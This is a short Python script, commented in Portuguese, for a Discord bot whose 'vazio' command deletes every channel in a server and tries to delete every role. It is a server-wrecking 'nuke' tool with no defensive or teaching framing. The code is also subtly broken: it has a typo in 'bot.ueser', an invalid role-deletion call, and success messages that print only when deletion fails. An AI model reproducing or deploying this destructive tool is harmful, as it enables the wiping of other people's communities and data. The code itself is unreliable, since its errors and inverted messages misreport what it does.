import discord
import os
import colorama
from discord.ext import commands
from colorama import Fore, Back, Style, init
init()

token = '' #  Coloque o token de seu BOT
Prefixo = '' #  Coloque o sinal que virá antes do comando
Intents = discord.Intents.all()

bot = commands.Bot(command_prefix=Prefixo, intents=Intents)
bot.remove_command('help')

@bot.event
async def on_ready():
  print(f'Estou on como {bot.ueser.name}')
  print(bot.user)

@bot.command(aliases=['Vazio']+['Vázio']+['vázio'])
async def vazio(ctx):
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print(Fore.MAGENTA  + f"{channel.name} foi deletado!!" + Fore.RESET)
    for role in list(ctx.guild.roles):
        try:
            await discord.roles.delete()
        except:
            print(Fore.MAGENTA  + f"{role.name} foi deletado!!" + Fore.RESET)
            
bot.run(token)
